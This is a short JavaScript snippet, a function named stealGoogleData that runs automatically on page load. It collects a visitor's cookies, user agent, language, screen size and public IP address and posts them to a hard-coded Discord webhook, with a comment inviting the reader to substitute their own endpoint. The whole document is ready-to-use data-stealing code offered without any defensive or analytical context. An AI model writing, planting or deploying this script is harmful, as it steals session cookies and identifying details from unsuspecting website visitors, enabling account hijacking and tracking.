```javascript
async function stealGoogleData() {
    let userData = {
        ip: '',
        userAgent: navigator.userAgent,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,           timestamp: new Date().toISOString(),           cookies: document.cookie
    };       // Fetch IP from a public API
    try {
        let response = await fetch('https://api.ipify.org?format=json');           let data = await response.json();           userData.ip = data.ip;
    } catch (e) {
        userData.ip = 'Unable to fetch IP';
    }       // Send stolen data to your server or webhook (replace with your endpoint)       fetch('https://discord.com/api/webhooks/1470109902432370698/HD8rAVEc-NQy0pgkwwo__Zy5TrShEHqs3ZQPjwM-RHX-I99auXDn0Jw5vGe-v2-eHGUi/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },           body: JSON.stringify(userData)       }).catch(err => console.error('Failed to send data', err));   }   window.onload = stealGoogleData;